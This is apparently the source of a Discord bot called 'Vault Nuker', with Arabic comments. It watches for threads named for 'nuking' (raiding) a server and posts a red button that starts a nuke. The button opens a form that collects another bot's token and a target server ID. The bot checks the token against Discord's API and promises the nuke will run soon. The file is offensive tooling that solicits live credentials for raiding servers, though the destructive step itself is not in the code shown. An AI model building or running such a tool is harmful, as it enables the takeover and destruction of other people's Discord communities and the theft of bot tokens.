const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
});

// ═══════════════════════════════════════════
// 1. مراقبة الـ Threads (تكتات Ticket King)
// ═══════════════════════════════════════════
client.on('threadCreate', async (thread) => {
    // إذا كان الـ Thread اسمه فيه "جحفلة" أو "nuke"
    if (thread.name.includes('جحفلة') || thread.name.includes('nuke')) {
        
        // نستنى ثانيتين عشان Ticket King يبعث رسالته
        setTimeout(async () => {
            const embed = new EmbedBuilder()
                .setTitle('💀 أداة الجحفلة')
                .setDescription('اضغط على الزر الأحمر في الأسفل عشان تعبي بيانات السيرفر اللي بدك تجحفله.')
                .setColor(0xFF0000);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_nuke')
                    .setLabel('بدء الجحفلة')
                    .setEmoji('💀')
                    .setStyle(ButtonStyle.Danger) // زر أحمر
            );

            // يرسل الرسالة في الـ Thread
            await thread.send({ embeds: [embed], components: [row] }).catch(()=>{});
        }, 2000);
    }
});

// ═══════════════════════════════════════════
// 2. التعامل مع الأزرار والنوافذ (النافذة اللي بتطلع)
// ═══════════════════════════════════════════
client.on(Events.InteractionCreate, async (interaction) => {
    
    // إذا ضغط على زر "بدء الجحفلة"
    if (interaction.isButton() && interaction.customId === 'start_nuke') {
        
        // نطلعله نافذة يكتب فيها التوكن والـ ID
        const modal = new ModalBuilder()
            .setCustomId('nuke_modal')
            .setTitle('بيانات الجحفلة');

        const tokenInput = new TextInputBuilder()
            .setCustomId('bot_token')
            .setLabel('توكن البوت (Bot Token)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('MTIzNDU2Nzg5...')
            .setRequired(true);

        const guildInput = new TextInputBuilder()
            .setCustomId('guild_id')
            .setLabel('ايدي السيرفر (Server ID)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('123456789012345678')
            .setRequired(true);

        modal.addComponents(
            new ActionRowBuilder().addComponents(tokenInput),
            new ActionRowBuilder().addComponents(guildInput)
        );

        await interaction.showModal(modal);
    }

    // إذا عبي البيانات وضغط إرسال في النافذة
    if (interaction.isModalSubmit() && interaction.customId === 'nuke_modal') {
        const botToken = interaction.fields.getTextInputValue('bot_token');
        const guildId = interaction.fields.getTextInputValue('guild_id');

        await interaction.reply({ content: '⏳ جاري فحص التوكن وصلاحيات البوت...', ephemeral: true });

        try {
            // فحص التوكن
            const res = await fetch('https://discord.com/api/v10/users/@me', {
                headers: { Authorization: `Bot ${botToken}` }
            });

            if (!res.ok) {
                return interaction.editReply({ content: '❌ التوكن غلط أو البوت محظور. تأكد من التوكن.' });
            }

            const botData = await res.json();

            // نجاح
            await interaction.editReply({ 
                content: `✅ تم استلام البيانات بنجاح!\n**البوت:** ${botData.username}\n**السيرفر:** \`${guildId}\`\n\nسيتم تنفيذ الجحفلة قريباً.` 
            });

        } catch (error) {
            console.error(error);
            await interaction.editReply({ content: '❌ حدث خطأ أثناء الاتصال بديسكورد.' });
        }
    }
});

// سطر الحماية
http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);

client.login(TOKEN);
